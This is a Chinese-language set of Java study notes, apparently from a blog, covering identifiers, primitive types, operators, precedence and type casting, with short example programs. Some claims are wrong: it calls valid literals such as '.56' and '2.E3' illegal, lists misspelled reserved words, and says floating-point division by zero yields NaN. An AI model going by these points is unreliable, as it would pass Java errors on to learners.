<h4 id="一、-标识符、注释和分隔符"><a href="#一、-标识符、注释和分隔符" class="headerlink" title="一、 标识符、注释和分隔符"></a><font color="#FF6347" face="Comic sans MS">一、 标识符、注释和分隔符</font></h4><p><font color="red" face="Arial">📒标识符：</font><font face="Arial">是程序员用来标记语言中元素（变量、常量、类、对象等）名称的命名记号。</font></p>
<table><tr><td bgcolor=#B0E0E6>Java中的标识符遵守先定义后使用的原则。即只有定义了的标识符，才可在语句部分使用。</td></tr></table>

<p><font color="#EE7942" face="Arial"><strong>Java定义标识符的规则：</strong></font><br>(1)由字母、 数字、下划线、$组成，不能由数字开头<br>(2)不能是Java中的保留字(关键字)；<br>(3)大小写敏感，长度无限制。</p>
<p>&emsp;</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>保留字</th>
</tr>
</thead>
<tbody><tr>
<td><font color="#EE3A8C" face="Arial">类型保留字</font></td>
<td><font face="Comic sans MS" color="#EE3A8C"> boolean, byte, char, short,  int, long,float, double, void</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">语句保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> if, else, switch, case, default, break, for, while, do,return,continue,try,catch,finally,throw,synchronized</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">表达式保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> new, null, this, super</td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">修饰符保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> abstract, final, public, private, protected, static, transient, volatile </font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">类、方法保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> class, throws, native, instanceof</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">扩展类构筑模块保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> package, import, extends, implements, interface<font face="Comic sans MS" color="#EE3A8C"></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">其它保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> cast, futuer, generic, inner, oprater, outer, rest,var<font face="Comic sans MS"></td>
</tr>
</tbody></table>
<p>&emsp;<br>&emsp;</p>
<h5 id="1-1-标识符"><a href="#1-1-标识符" class="headerlink" title="1.1  标识符"></a><font color="#3CB371" face="Comic sans MS">1.1  标识符</font></h5><table><tr><td bgcolor=#ADD8E6><font color=""  face="Comic sans MS">**举例**：
合法标识符：     A , a1,  $Systembol,  square,  ex_sa
不合法标识符：          1a          （以数字1开头）
                       break       （禁止使用保留字）
                       TWO  WORDS  （含有空格）
                       .NO         （有圆点）
</font></td></tr></table>


<p>&emsp;</p>
<h5 id="1-2-注释"><a href="#1-2-注释" class="headerlink" title="1.2  注释"></a><font color="#3CB371" face="Comic sans MS">1.2  注释</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**Java有三种注释形式：**
      1.“//” 单行注释。表示从此向后，直到行尾都是注释。
      2.“/\*……\*/“ 块注释。在“/\*”和“\*/”之间都是注释。
      3.“/\*\*……\*/”文档注释。所有在“/\*\*”和“\*/”之间的内容可以用来自动形成文档。</font></td></tr></table>


<p>&emsp;</p>
<h5 id="1-3-语句"><a href="#1-3-语句" class="headerlink" title="1.3  语句"></a><font color="#3CB371" face="Comic sans MS">1.3  语句</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">与C++一样，Java中的语句也是最小的执行单位。
&emsp;&emsp;&emsp;&emsp;各个语句之间以  ;  间隔
&emsp;&emsp;&emsp;&emsp;X大括号{   }内的一系列语句称为语句块</font></td></tr></table>

<hr>
<hr>
<p>&emsp;<br>&emsp;</p>
<h4 id="二、-变量和常量"><a href="#二、-变量和常量" class="headerlink" title=" 二、 变量和常量"></a><font color="#FF6347" face="Comic sans MS"> 二、 变量和常量</font></h4><h5 id="2-1-变量"><a href="#2-1-变量" class="headerlink" title="2.1  变量"></a><font color="#3CB371" face="Comic sans MS">2.1  变量</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">📒Java的变量有两种：<font color="red">**局部变量  类成员变量**</font>
变量必须先定义后使用！变量的定义形式如下：
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<font color="red">类型      变量名表；</font></font></td></tr></table>

<blockquote>
<p>注意：局部变量在使用前必须给定初值，否则，将编译出错，而类成员变量无此要求。</p>
</blockquote>
<p><font face="Comic sans MS">如下出现编译错误，缺少“y=8;”</font></p>
<pre class="line-numbers language-bash"><code class="language-bash">class <span class="token function">test</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
  int x<span class="token punctuation">;</span>
  void method<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
      int y<span class="token punctuation">;</span> 
      System.out.println<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
      System.out.println<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
  public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
       <span class="token function">test</span> t<span class="token operator">=</span>new test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       t.method<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>&emsp;</p>
<h6 id="2-1-1-变量名"><a href="#2-1-1-变量名" class="headerlink" title="2.1.1  变量名 "></a><font color="#3CB371" face="Comic sans MS">2.1.1  变量名 </font></h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1. 📒在Java中用标识符来表示变量名**。
&emsp;&emsp;1.1 变量名中字母大写和小写是有区别的，如name和Name表示两个不同的变量名；
&emsp;&emsp;1.2 变量名标志存放变量值的内存位置，其内存存放的内容是变量的值。
**2. 📒命名方法**:
2.1 程序员应该为变量取有意义的名称，以利于程序的阅读和理解；
2.2 习惯上，变量名以小写字母开头，若一个变量名由超过一个单词所组成，则第一个单词之后的所有单词都以大写字母开头，以便于理解该变量名。
&emsp;&emsp;例如，anIntVar
</font></font></td></tr></table>

<p>&emsp;</p>
<h6 id="2-1-2-变量的类型"><a href="#2-1-2-变量的类型" class="headerlink" title="2.1.2   变量的类型 "></a><font color="#3CB371" face="Comic sans MS">2.1.2   变量的类型 </font></h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**变量类型用于表述数据的格式和结构。**
📒**Java中的数据类型可分为两大类：**
<font color="red">**基本数据类型：**</font>整数类型、实数类型、字符型、布尔型          
<font color="red">**构造数据类型：**</font>Java 语言中构造类型用类来描述。
</font></font></td></tr></table>

<hr>
<hr>
<p>&emsp;<br>&emsp;</p>
<h4 id="三、-基本数据类型表-变量和常量"><a href="#三、-基本数据类型表-变量和常量" class="headerlink" title=" 三、 基本数据类型表:变量和常量"></a><font color="#FF6347" face="Comic sans MS"> 三、 基本数据类型表:变量和常量</font></h4><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr1nnP.png" alt="1"></p>
<p>&emsp;</p>
<h5 id="3-1-整型"><a href="#3-1-整型" class="headerlink" title="3.1  整型"></a><font color="#3CB371" face="Comic sans MS">3.1  整型</font></h5><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr10NF.png" alt="2"></p>
<p>&emsp;</p>
<h6 id="3-1-1-整型常量"><a href="#3-1-1-整型常量" class="headerlink" title="3.1.1  整型常量"></a><font color="#3CB371" face="Comic sans MS">3.1.1  整型常量</font></h6><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr1jUS.png" alt="3"></p>
<p>&emsp;</p>
<h6 id="3-1-2-整型变量"><a href="#3-1-2-整型变量" class="headerlink" title="3.1.2  整型变量"></a><font color="#3CB371" face="Comic sans MS">3.1.2  整型变量</font></h6><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr3S3j.png" alt="4"></p>
<p>&emsp;</p>
<h5 id="3-2-实型"><a href="#3-2-实型" class="headerlink" title="3.2  实型"></a><font color="#3CB371" face="Comic sans MS">3.2  实型</font></h5><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr3uvR.png" alt="5"></p>
<p>&emsp;</p>
<h6 id="3-2-1实型常量有两种表示法："><a href="#3-2-1实型常量有两种表示法：" class="headerlink" title="3.2.1实型常量有两种表示法："></a><font color="#3CB371" face="Comic sans MS">3.2.1实型常量有两种表示法：</h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**(1)十进制表示法**
&emsp;&emsp;-3.5f&emsp;0.0f&emsp;123.45f&emsp;+678.9f
      要注意,采用十进制表示法时,小数点的两侧都必须有数字, 缺一不可，如+123．和 .56都是不合法的。
**(2)科学表示法：** <font face="Comic sans MS" color="red">**<尾数> E <阶码 > **</font>
&emsp;&emsp;-1.234567E+12&emsp;(-1.2345678901×1012)
&emsp;&emsp;尾数&emsp;阶码
**注意：**<font color="red">
&emsp;&emsp;&emsp;&emsp;尾数必须有，但小数部分可无；
&emsp;&emsp;&emsp;&emsp;阶码必须有，必须是整数。
&emsp;&emsp;&emsp;&emsp;基数是10
</font></font></td></tr></table>        
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**下列表示都是不正确的。**
&emsp;&emsp;E-6&emsp;&emsp;（缺尾数）
&emsp;&emsp;3E&emsp;&emsp;（无阶码）
&emsp;&emsp;2.E3&emsp;&emsp;（尾数出错）
&emsp;&emsp;2E1.2&emsp;&emsp;（阶码非整数）
&emsp;
**📒实型变量的定义**
例如：
float aFloatVar;
double aDoubleVar;<font>
</font></font></td></tr></table>

<p>&emsp;</p>
<h5 id="3-3-布尔型"><a href="#3-3-布尔型" class="headerlink" title="3.3      布尔型"></a><font color="#3CB371" face="Comic sans MS">3.3      布尔型</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒布尔数据类型用于表达逻辑状态：**
&emsp;&emsp;布尔型数据只有两个值：true和false。
&emsp;&emsp;<font face="Comic sans MS" color="red">**注意: Java中不可将布尔类型看做整型值。true不对应1，false不对应0，不像C++一样。**</font></font></font></td></tr></table>

<p>&emsp;</p>
<h5 id="3-4-字符型"><a href="#3-4-字符型" class="headerlink" title="3.4      字符型"></a><font color="#3CB371" face="Comic sans MS">3.4      字符型</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒字符类型用来表示单个字符，采用16位二进制Unicode 编码表示**
字符常量是用两个单引号括起来的一个字符
&emsp;&emsp;例如： 'A'；  'a'； '2'； '我'；
也可用unicode代码表示一个字符常量
&emsp;&emsp;例如： '\u0041'
</font></font></td></tr></table>    

<p>&emsp;<br>&emsp;</p>
<h4 id="四、-Unicode编码"><a href="#四、-Unicode编码" class="headerlink" title=" 四、 Unicode编码"></a><font color="#FF6347" face="Comic sans MS"> 四、 Unicode编码</font></h4><table><tr><td bgcolor=#EEE0E5><font face="Comic sans MS">**📒Unicode编码：**
1. Java的字符使用Unicode编码，使用两个字节(16位)，所以它几乎包括所有字符，中文、日文、…，它支持世
   界上所有语言。  
2. 大多数语言使用ASCII码，用8位表示一个字符。ASCII码是Unicode码的一个子集，Unicode表示ASCII
   码时，其高位为0，它是其前255个字符。Unicode字符通常用十六进制。例如“\u0000”-“\u00ff”表示
   ASCII码集。”\u”表示转义字符，它用来表示其后四个十六进制数字是Unicode代码。
</font></font></td></tr></table> 

<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java运算符和数据类型转换(3.4-3.6)</title>
    <url>/post/Java-Language-2-2/</url>
    <content><![CDATA[<p>&ensp;<br>&ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>运算符及表达式、运算符的优先级、数据类型转换</font></center>

<ul>
<li><input disabled="" type="checkbox"> <strong>3.4-3.6学习知识点</strong><ul>
<li><input disabled="" type="checkbox"> 运算符及表达式<ul>
<li><input disabled="" type="checkbox"> 算术运算符</li>
<li><input disabled="" type="checkbox"> 关系运算符</li>
<li><input disabled="" type="checkbox"> 逻辑运算符</li>
<li><input disabled="" type="checkbox"> 位运算符</li>
<li><input disabled="" type="checkbox"> 赋值运算符</li>
<li><input disabled="" type="checkbox"> 逻辑运算符</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> 运算符的优先级</li>
<li><input disabled="" type="checkbox"> 数据类型转换<ul>
<li><input disabled="" type="checkbox"> 自动类型转换</li>
<li><input disabled="" type="checkbox"> 手动强制类型转换</li>
<li><input disabled="" type="checkbox"> 隐含强制类型转换</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>&ensp;<br>&ensp;</p>
<h3 id="一、-运算符及表达式"><a href="#一、-运算符及表达式" class="headerlink" title="一、 运算符及表达式 "></a><font color="#FF6347" face="Comic sans MS">一、 运算符及表达式 </font></h3><p><font face="Comic sans MS">&emsp;Java可以对各种类型的数据进行加工，这种加工过程称为<font color="#00B2EE"><strong>运算</strong></font> 。其中表示各种不同运算的符号称为<font color="#00B2EE"><strong>运算符</strong></font> ，参与运算的数据称为<font color="#00B2EE"><strong>操作数</strong></font> 。操作数和运算符按一定语法形式组成的符号序列称为表达式。每个表达式经过运算后都会产生一个确定的值。<br></font> </p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒运算符按其功能分为七类：**</font>
1. 算术运算符  + 、-、 \*、 /、%、 ++、 --
2. 关系运算符  > 、<、 >=、 <=、 ==、 !=
3. 逻辑运算符  ！、&&、||、&、|
4. 位运算符     >>、<<、>>>、&、|、^、~
5. 条件运算符  ？：
6. 赋值运算符  =、+=、-= 、\*= 、/=
7. 其他：下标运算符[]

<p><font color="red"><strong>📒运算符按其要求的操作数个数分为三种：</strong></font></p>
<ol>
<li>一元运算符  如  ++、–</li>
<li>二元运算符  如  +、-、*、/、%(求模)</li>
<li>三元运算符  如  ？：<br></font></td></tr></table></li>
</ol>
<hr>
<hr>
<p>&emsp;</p>
<h4 id="1-1-算术运算符"><a href="#1-1-算术运算符" class="headerlink" title="1.1  算术运算符"></a><font color="#3CB371" face="Comic sans MS">1.1  算术运算符</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒算术运算符中的单目运算符**</font>
          如   +（一元加，取正值）、
               -（一元减，取负值）、
               ++ （增1运算符）、\-\- （减1运算符）

<p><strong>增1运算符(++)和减1运算符(--)：</strong><br>   只能用于变量，而不能用于常量或表达式。增量运算符和减量运算符的功能是将操作数的值加1或减1.</p>
<p>(1)<font color="red">增1运算符（减1运算符）在操作数的<strong>前面</strong>，</font>首先对操作数本身进行增减1运算，然后再参与其所在表达式的<br>  运算。<br>例：如果变量a的值为5，求下列表达式及a的值<br>      ① ++a +10<br>          表达式的值为16，a变为6<br>      ② --a +10<br>          表达式的值为14，a变为4<br>(2)<font color="red">增1运算符（减1运算符）在操作数的<strong>后面</strong>，</font>则首先让操作数参与计算整个表达式的值，然后再对操作数进行<br>   增减运算<br>  例：如果变量a的值为5，求下列表达式及a的值<br>            ① a++ +10<br>                   表达式的值为15，a变为6<br>            ② a-- +10<br>                   表达式的值为15，a变为4<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">练习题1：写出该程序的输出结果</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">           int a=5;</span><br><span class="line">           System.out.println(++a);</span><br><span class="line">           System.out.println(--a);</span><br><span class="line">           System.out.println(a++);</span><br><span class="line">           System.out.println(a--);</span><br><span class="line">&#125; </span><br><span class="line">&#125;                        </span><br><span class="line">输出结果：</span><br><span class="line">6</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒算术运算符中的双目运算符 **</font>       
 如     +（加）、-（减）、\*（乘）、/（除）、  % （取余数或取模）。
       +，-，\* 是通常意义的加、减、乘
如果整数相除，则结果取整。如 5/2 得到结果2。    
如果浮点数相除，则是我们通常意义上的除法，如5.0/2.0结果为2.5。
%是取余，如 5%2结果为1
                         5.2%2结果为1.2
                         5.2%2.2结果为0.8 
                         10%-4结果2； -10%-4结果-2 

<p><font color="red"><strong>注意：</strong></font> 如果整数相除或取模 第二个操作数为0 编译无错 运行会出错 抛出异常；<br>          如果浮点数相除或取模 第二个操作数为0 结果为NaN 。<br>注意：</p>
<ol>
<li>整数    int a=10/0     运行报错<pre><code>         int a=10%0   运行报错</code></pre>
</li>
<li>浮点数<br>  double a=10.0/0     Infinity(正无穷大)<br>  double a=-10.0/0   -Infinity（负无穷大）<br>  double a=0.0/0        NaN<br>  double a=0.0%0        NaN<br></font></td></tr></table></li>
</ol>
<blockquote>
<blockquote>
<p><strong>思考：</strong>某个培训中心要为新到的学员安排房间，假设共有x个学员，每个房间可以住6人，让你用一个公式来计算他们要住的房间数？<br>答案：  (x+5)/6<br>这也可以用于计算留言板的页数。 </p>
</blockquote>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-关系运算符"><a href="#1-2-关系运算符" class="headerlink" title="1.2  关系运算符"></a><font color="#3CB371" face="Comic sans MS">1.2  关系运算符</font></h4><font face="Comic sans MS">
<font color="#00B2EE">**1.关系运算符有七种：**</font>== ，!= ，< ,<= , > ,>= , instanceof  (对象运算符)
<font color="#00B2EE">**2.关系表达式的结果类型为布尔型**</font>
<font color="#00B2EE">**3.instanceof：**</font>用来确定一对象是否是某一指定类的对象</font>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> class <span class="built_in">test</span></span><br><span class="line">&#123;    public static void main(String args[])</span><br><span class="line">     &#123;    <span class="built_in">test</span> t1=new <span class="built_in">test</span>();</span><br><span class="line">          <span class="keyword">if</span>(t1 instanceof <span class="built_in">test</span>)&#123; System.out.println(<span class="string">&quot;是&quot;</span>);&#125;    </span><br><span class="line">     &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="red" face="Comic sans MS"><strong>📒关系表达式</strong></font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3864c7165e7.png" alt="1.png"></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-逻辑运算符"><a href="#1-3-逻辑运算符" class="headerlink" title="1.3  逻辑运算符"></a><font color="#3CB371" face="Comic sans MS">1.3  逻辑运算符</font></h4><p><img data-src="https://i.loli.net/2019/01/11/5c3866ddb16bb.png" alt="2.png"> <img data-src="https://i.loli.net/2019/01/11/5c38674613277.png" alt="3.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：分析下列程序的输出结果</span><br><span class="line">class <span class="built_in">test</span>&#123;    </span><br><span class="line">	public static void main(String args[])&#123; </span><br><span class="line">		boolean s;int i=100;</span><br><span class="line">		s=(3&gt;2)&amp;&amp;(i++==1);</span><br><span class="line">		System.out.println(i);</span><br><span class="line">		i=100;</span><br><span class="line">		s=(3&lt;2)&amp;&amp;(i++==1);</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line">输出结果：</span><br><span class="line">101</span><br><span class="line">100</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-位运算符"><a href="#1-4-位运算符" class="headerlink" title="1.4  位运算符"></a><font color="#3CB371" face="Comic sans MS">1.4  位运算符</font></h4><p><img data-src="https://i.loli.net/2019/01/11/5c386923e4c7a.png" alt="4.png"><img data-src="https://i.loli.net/2019/01/11/5c38692468530.png" alt="5.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：分析下列程序的输出结果</span><br><span class="line">int a=7, b=8, c;</span><br><span class="line">	c = a &amp; b;     //c=00000000000000000000000000000000=0</span><br><span class="line">	c = a | b;     //c=00000000000000000000000000001111=15</span><br><span class="line">	c = a ^ b;     //c=00000000000000000000000000001111=15</span><br><span class="line">    c =~a;         //c=11111111111111111111111111111000=-8</span><br><span class="line"></span><br><span class="line">例：分析下列程序的输出结果</span><br><span class="line">    int a=7,c;     //a=00000000000000000000000000000111</span><br><span class="line">	c = a&gt;&gt;3;      //c=00000000000000000000000000000000=0</span><br><span class="line">	c = a &lt;&lt; 3;    //c=00000000000000000000000000111000=56</span><br><span class="line">	c = a &gt;&gt;&gt; 3;   //c=00000000000000000000000000000000=0</span><br><span class="line">int a =-8; </span><br><span class="line">System.out.println(a&gt;&gt;&gt;1) //结果2147483644</span><br><span class="line">int i=88&gt;&gt;32; System.out.println(i)  //结果88</span><br><span class="line">//（在进行移位之前，java系统首先把移的位数与被移位数求余数，然后移动这个位数）</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font><br>（1）右移n位后的结果与除以2的n次方效果相同<br>（2）左移n位后的结果与乘以2的n次方效果相同<br>（3）无符号右移要慎重<br></font></p>
<blockquote>
<blockquote>
<p>思考：  如何用一个表达式计算2的X次方？<br>答案：  1&lt;&lt;x<br>将1左移x位 </p>
</blockquote>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-5-赋值运算符"><a href="#1-5-赋值运算符" class="headerlink" title="1.5  赋值运算符"></a><font color="#3CB371" face="Comic sans MS">1.5  赋值运算符</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**(1)简单赋值运算符    = **</font> 
将等号右边的表达式的值赋给等号左边的变量
       例如：     int c,d;
                     c=1;
                     d=c+10;
<font color="red">**(2)复合赋值运算符      +=、-=、*=、/=、%= 等**</font> 
一般形式为：   变量 op= 表达式
等价于:     变量 =变量 op 表达式
c += a;     //c = c +a;
c -= a;     //c = c -a;
c *= a;     //c = c * a;

<p>例：int a=1;<br>        double x=2;<br>        a+=2;           // 就是a=a+2, 结果使a的值为3<br>        x*=x+3;       // 就是x=x*(x+3), 结果使x的值为10.0<br>        int a=b=c=d=12;<br>        int a=(b=(c=(d=12))); //赋值运算符有返回值，返回值是=右边的值</p>
<p><font color="red"><strong>注意：</strong></font></p>
<ol>
<li>boolean型的只能赋给boolean型；</li>
<li>其他七种类型如果能自动转换则可直接赋值，否则要进行强制类型转换。<br></font></td></tr></table></li>
</ol>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-6-条件运算符"><a href="#1-6-条件运算符" class="headerlink" title="1.6  条件运算符"></a><font color="#3CB371" face="Comic sans MS">1.6  条件运算符</font></h4><p><font face="Comic sans MS">Java 中唯一的三元运算符，其格式如下：<br><font color="#00B2EE">&emsp;&emsp;<strong>变量 =  &lt;布尔表达式&gt; ? &lt;表达式1&gt; : &lt;表达式2&gt;</strong></font><br>含义是：当&lt;布尔表达式&gt;为真时，变量的值为&lt;表达式1&gt;的值，否则为&lt;表达式2&gt;的值。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例:  条件运算</span><br><span class="line">public class max </span><br><span class="line">&#123;</span><br><span class="line">       public static void main(String args[]) </span><br><span class="line">      &#123;</span><br><span class="line">            int x=20,y=30,max;</span><br><span class="line">            max = (x&gt;y) ? x : y;      </span><br><span class="line">            System.out.println(“max=”+max);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：max=30</span><br><span class="line"></span><br><span class="line">练习题2:</span><br><span class="line">public class max </span><br><span class="line">&#123;</span><br><span class="line">       public static void main(String args[]) </span><br><span class="line">      &#123;</span><br><span class="line">      int a=3,b=4,c;</span><br><span class="line">      c=a&gt;b? ++a:b++;</span><br><span class="line">      System.out.println(a+<span class="string">&quot;、&quot;</span>+b+<span class="string">&quot;、&quot;</span>+c);    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">3、5、4</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&emsp;<br>&emsp;</p>
<h3 id="二、-运算符的优先级"><a href="#二、-运算符的优先级" class="headerlink" title="二、 运算符的优先级 "></a><font color="#FF6347" face="Comic sans MS">二、 运算符的优先级 </font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式的运算次序取决于表达式中各种运算符的优先级。</strong></font><br>     （1）优先级高的先运算，优先级低的后运算。<br>     （2）括号( )的优先级最高。<br>     （3）优先级相同的情况下要考虑结合性，即从左向右运算还是从右向左运算。<br><font color="#00B2EE"><strong>Java语言规定的运算符的优先级如下表所示</strong></font><br></font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3871997c702.png" alt="6.png"></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**运算符的优先级与结合性的一些规律：**</font> 
1. 优先级
<font color="red">       () > 单目运算符 > 双目运算符 > 三目运算符 > 赋值运算符</font> 
双目： <font color="red">算术>关系>逻辑</font> 。
2. 结合性
<font color="red">大多数运算符结合性为从左至右
赋值运算符的结合性为从右至左</font> 
    int a,b=3,c=5;
    a = b = c;    //结果：a、b、c均为 5 

<p><font color="red"><strong>表达式写法的习惯：</strong></font> </p>
<p>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：</span><br><span class="line">    (1) a + b * c</span><br><span class="line">    (2) a = b || c</span><br><span class="line">    (3) a + b &lt; c &amp;&amp; d==e</span><br><span class="line">    (4) a=8 – 2 * 3 &lt;4 &amp;&amp; 5 &lt; 2     结果：<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式写法的习惯：</strong></font><br>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font> </p>
<hr>
<hr>
<p>&emsp;<br>&emsp;</p>
<h3 id="三、-数据类型转换"><a href="#三、-数据类型转换" class="headerlink" title="三、 数据类型转换  "></a><font color="#FF6347" face="Comic sans MS">三、 数据类型转换  </font></h3><h4 id="3-1-自动类型转换"><a href="#3-1-自动类型转换" class="headerlink" title="3.1  自动类型转换"></a><font color="#3CB371" face="Comic sans MS">3.1  自动类型转换</font></h4><p><font face="Comic sans MS">(1) Java中整型、实型、字符型数据可以混合运算。<br><font color="#00B2EE"><strong>运算过程中，Java自动把精度较低的类型转换为另一种精度较高的类型。</strong></font><br>(2) 低精度的值赋给高精度的变量可以自动转换,不出现编译错误；<font color="#00B2EE"><strong>相反会出现编译错误,需要强制转换。</strong></font><br>例如: float x=(float)5.0;long x=2;</p>
<p><font color="red"><strong>注意：</strong></font> 如果byte、short、char在一起运算时，会先将这些值转换为int型。再进行运算，结果为int型。 如表达式中一个变量是int型，另一个是long型，则先将int型转为long型，再进行计算。最后结果为long型。</font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3881774735b.png" alt="7.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下列代码会编译出错，提示c = (a + b);有精度损失</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">        byte a = 1;</span><br><span class="line">        byte b = 1;</span><br><span class="line">        byte c = (a + b);</span><br><span class="line">      &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>练习题3:<br>下列表达式结果是什么类型？<br>‘A’+2+2.5<br>double</p>
</blockquote>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="3-2-手动强制类型转换"><a href="#3-2-手动强制类型转换" class="headerlink" title="3.2  手动强制类型转换"></a><font color="#3CB371" face="Comic sans MS">3.2  手动强制类型转换</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>在Java中直接将高精度的值赋给低精度的变量会导致编译出错。这时可用强制类型转换来解决。</strong></font><br> 形式为：<br>&emsp;&emsp;<font color="red">       (类型名)表达式</font><br> 例如：<br>       int   i;   byte  b,c;<br>       b=(byte)345;      //上机测试知b得到89<br>       c=(byte)356;      //上机测试知c得到100<br>       i=(int)(3.8+6);   //强制转换后小数部分被截去，i得到9，不会四舍五入</p>
<p><font color="red"><strong>注意：</strong></font> </p>
<ol>
<li>强制类型转换可能造成信息的丢失；  </li>
<li>布尔型与其它基本类型之间不能转换。</font>

</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">加上强制类型转换，下列代码编译通过。</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;     public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">        byte a = 1;</span><br><span class="line">        byte b = 1;</span><br><span class="line">        byte c = (byte)(a + b);</span><br><span class="line">      &#125; &#125; </span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**运算时注意（一般的运算都有类型提升功能）：**</font> 
（1）在运算过程中，运算的结果至少是int型，即如果参与运算的两个数级别比int型低或是int型，则结果为
     int型；
（2）参与运算的数据如果有一个级别比int型高，则运算结果的类型与类型级别高的数相同；
